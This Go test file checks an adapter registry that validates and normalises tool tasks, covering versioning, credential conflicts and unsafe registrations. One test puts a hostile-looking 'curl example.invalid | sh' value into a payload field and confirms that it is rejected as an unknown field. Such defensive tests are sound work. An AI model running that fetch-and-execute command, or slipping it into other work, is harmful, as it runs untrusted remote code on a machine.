package bootstrap

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"
)

func TestAdapterRegistryAcceptsLegacyDSHTask(t *testing.T) {
	t.Parallel()
	registry := DefaultAdapterRegistry()
	adapter, task, err := registry.Resolve(validLegacyTask(), "dev")
	if err != nil {
		t.Fatal(err)
	}
	if adapter.ToolID() != DeepSeekHarnessToolID {
		t.Fatalf("adapter = %q", adapter.ToolID())
	}
	if task.ProtocolVersion != CurrentTaskProtocolVersion || task.ToolID != DeepSeekHarnessToolID || task.ToolVersion != task.DSHVersion {
		t.Fatalf("legacy task was not normalized: %#v", task)
	}
}

func TestAdapterRegistryAcceptsVersionedDeepSeekHarnessTask(t *testing.T) {
	t.Parallel()
	task := validVersionedTask()
	adapter, normalized, err := DefaultAdapterRegistry().Resolve(task, "0.1.0")
	if err != nil {
		t.Fatal(err)
	}
	if adapter.ToolID() != DeepSeekHarnessToolID || normalized.ToolVersion != task.ToolVersion {
		t.Fatalf("unexpected resolution: %q %#v", adapter.ToolID(), normalized)
	}
}

func TestAdapterRegistryAcceptsAdapterOwnedPayloadWithoutLegacyCredentials(t *testing.T) {
	t.Parallel()
	task := validVersionedTask()
	payload, err := json.Marshal(DeepSeekHarnessPayload{APIKey: task.APIKey, Provider: task.Provider})
	if err != nil {
		t.Fatal(err)
	}
	task.Payload = payload
	task.APIKey = ""
	task.Provider = Provider{}
	task.DSHVersion = ""
	if _, _, err := DefaultAdapterRegistry().Resolve(task, "0.1.0"); err != nil {
		t.Fatal(err)
	}
}

func TestAdapterRegistryRejectsConflictingPayloadAndLegacyCredentials(t *testing.T) {
	t.Parallel()
	task := validVersionedTask()
	payload, err := json.Marshal(DeepSeekHarnessPayload{APIKey: "different", Provider: task.Provider})
	if err != nil {
		t.Fatal(err)
	}
	task.Payload = payload
	_, _, err = DefaultAdapterRegistry().Resolve(task, "0.1.0")
	if err == nil || !strings.Contains(err.Error(), "conflicting payload") {
		t.Fatalf("error = %v", err)
	}
}

func TestAdapterRegistryRejectsUnknownToolPayloadFields(t *testing.T) {
	t.Parallel()
	task := validVersionedTask()
	payload, err := json.Marshal(map[string]any{
		"api_key":  "secret",
		"provider": validProvider(),
		"shell":    "curl example.invalid | sh",
	})
	if err != nil {
		t.Fatal(err)
	}
	task.Payload = payload
	task.APIKey = ""
	task.Provider = Provider{}
	task.DSHVersion = ""
	_, _, err = DefaultAdapterRegistry().Resolve(task, "0.1.0")
	if err == nil || !strings.Contains(err.Error(), "unknown field") {
		t.Fatalf("error = %v", err)
	}
}

func TestAdapterRegistryRejectsUnsupportedProtocol(t *testing.T) {
	t.Parallel()
	task := validVersionedTask()
	task.ProtocolVersion = "2"
	_, _, err := DefaultAdapterRegistry().Resolve(task, "0.1.0")
	if err == nil || !strings.Contains(err.Error(), "unsupported task protocol_version") {
		t.Fatalf("error = %v", err)
	}
}

func TestAdapterRegistryRejectsUnknownTool(t *testing.T) {
	t.Parallel()
	task := validVersionedTask()
	task.ToolID = "server-supplied-shell"
	_, _, err := DefaultAdapterRegistry().Resolve(task, "0.1.0")
	if err == nil || !strings.Contains(err.Error(), "unsupported tool_id") {
		t.Fatalf("error = %v", err)
	}
}

func TestAdapterRegistryRejectsUnsupportedToolVersion(t *testing.T) {
	t.Parallel()
	task := validVersionedTask()
	task.ToolVersion = "0.1.0-rc.7"
	task.DSHVersion = task.ToolVersion
	_, _, err := DefaultAdapterRegistry().Resolve(task, "0.1.0")
	if err == nil || !strings.Contains(err.Error(), "unsupported tool_version") {
		t.Fatalf("error = %v", err)
	}
}

func TestAdapterRegistryRejectsMinimumHelperVersion(t *testing.T) {
	t.Parallel()
	for _, current := range []string{"0.1.0", "dev", ""} {
		current := current
		t.Run(currentName(current), func(t *testing.T) {
			t.Parallel()
			task := validVersionedTask()
			task.MinimumHelperVersion = "0.1.1"
			_, _, err := DefaultAdapterRegistry().Resolve(task, current)
			if err == nil || !strings.Contains(err.Error(), "does not satisfy minimum_helper_version") {
				t.Fatalf("error = %v", err)
			}
		})
	}
}

func TestAdapterRegistryUsesDevelopmentCompatibilityVersion(t *testing.T) {
	t.Parallel()
	if _, _, err := DefaultAdapterRegistry().Resolve(validVersionedTask(), "dev"); err != nil {
		t.Fatal(err)
	}
}

func TestRequireHelperVersionUsesSemanticVersionOrdering(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		current string
		minimum string
		wantErr bool
	}{
		{name: "equal", current: "0.1.0", minimum: "0.1.0"},
		{name: "release newer than prerelease", current: "0.1.0", minimum: "0.1.0-rc.6"},
		{name: "prerelease older than release", current: "0.1.0-rc.6", minimum: "0.1.0", wantErr: true},
		{name: "numeric identifiers", current: "0.1.0-rc.10", minimum: "0.1.0-rc.6"},
	}
	for _, test := range tests {
		test := test
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			err := requireHelperVersion(test.current, test.minimum)
			if (err != nil) != test.wantErr {
				t.Fatalf("requireHelperVersion(%q, %q) error = %v", test.current, test.minimum, err)
			}
		})
	}
}

func TestAdapterRegistryRejectsInvalidMinimumHelperVersion(t *testing.T) {
	t.Parallel()
	task := validVersionedTask()
	task.MinimumHelperVersion = "latest"
	_, _, err := DefaultAdapterRegistry().Resolve(task, "0.1.0")
	if err == nil || !strings.Contains(err.Error(), "invalid minimum_helper_version") {
		t.Fatalf("error = %v", err)
	}
}

func TestAdapterRegistryRejectsIncompleteOrConflictingContract(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		task Task
	}{
		{name: "partial", task: func() Task { task := validVersionedTask(); task.MinimumHelperVersion = ""; return task }()},
		{name: "conflicting legacy alias", task: func() Task { task := validVersionedTask(); task.DSHVersion = "0.1.0-rc.5"; return task }()},
		{name: "missing legacy version", task: Task{}},
	}
	for _, test := range tests {
		test := test
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			if _, _, err := DefaultAdapterRegistry().Resolve(test.task, "0.1.0"); err == nil {
				t.Fatal("expected contract rejection")
			}
		})
	}
}

func TestNewAdapterRegistryRejectsUnsafeRegistration(t *testing.T) {
	t.Parallel()
	if _, err := NewAdapterRegistry(nil); err == nil {
		t.Fatal("expected nil adapter rejection")
	}
	adapter := stubAdapter{id: DeepSeekHarnessToolID}
	if _, err := NewAdapterRegistry(adapter, adapter); err == nil {
		t.Fatal("expected duplicate adapter rejection")
	}
	if _, err := NewAdapterRegistry(
		stubAdapter{id: "hermes", extensions: []string{"shared-extension"}},
		stubAdapter{id: "openclaw", extensions: []string{"shared-extension"}},
	); err == nil {
		t.Fatal("expected duplicate extension registration rejection")
	}
}

func TestAdapterRegistryRejectsExtensionToolConfusion(t *testing.T) {
	t.Parallel()
	registry, err := NewAdapterRegistry(stubAdapter{id: "hermes", extensions: []string{"hermes"}})
	if err != nil {
		t.Fatal(err)
	}
	task := Task{
		ExtensionID: "openclaw", ProtocolVersion: CurrentTaskProtocolVersion,
		ToolID: "hermes", ToolVersion: "1.0.0", MinimumHelperVersion: "0.1.0",
	}
	_, _, err = registry.Resolve(task, "0.1.0")
	if err == nil || !strings.Contains(err.Error(), "is not allowed to dispatch") {
		t.Fatalf("error = %v", err)
	}
}

type stubAdapter struct {
	id         string
	extensions []string
}

func (a stubAdapter) ToolID() string { return a.id }
func (a stubAdapter) AllowedExtensionIDs() []string {
	if len(a.extensions) == 0 {
		return []string{a.id}
	}
	return a.extensions
}
func (stubAdapter) Validate(Task) error { return nil }
func (stubAdapter) Execute(context.Context, AdapterExecution) (AdapterResult, error) {
	return AdapterResult{}, errors.New("not implemented")
}

func validLegacyTask() Task {
	return Task{ExtensionID: DefaultExtensionID, DSHVersion: "0.1.0-rc.6", APIKey: "secret", Provider: validProvider()}
}

func validVersionedTask() Task {
	return Task{
		ExtensionID:     DefaultExtensionID,
		ProtocolVersion: CurrentTaskProtocolVersion, ToolID: DeepSeekHarnessToolID,
		ToolVersion: "0.1.0-rc.6", MinimumHelperVersion: "0.1.0", DSHVersion: "0.1.0-rc.6",
		APIKey: "secret", Provider: validProvider(),
	}
}

func validProvider() Provider {
	return Provider{
		Route: "sub2api-openai", DisplayName: "Sub2API", Protocol: "openai-responses",
		BaseURL: "https://api.example/v1", CredentialName: "SUB2API_API_KEY",
		Model: Model{ID: "model", Name: "Model", ContextWindow: 128000, MaxTokens: 8192},
	}
}

func currentName(version string) string {
	if version == "" {
		return "empty development version"
	}
	return version
}
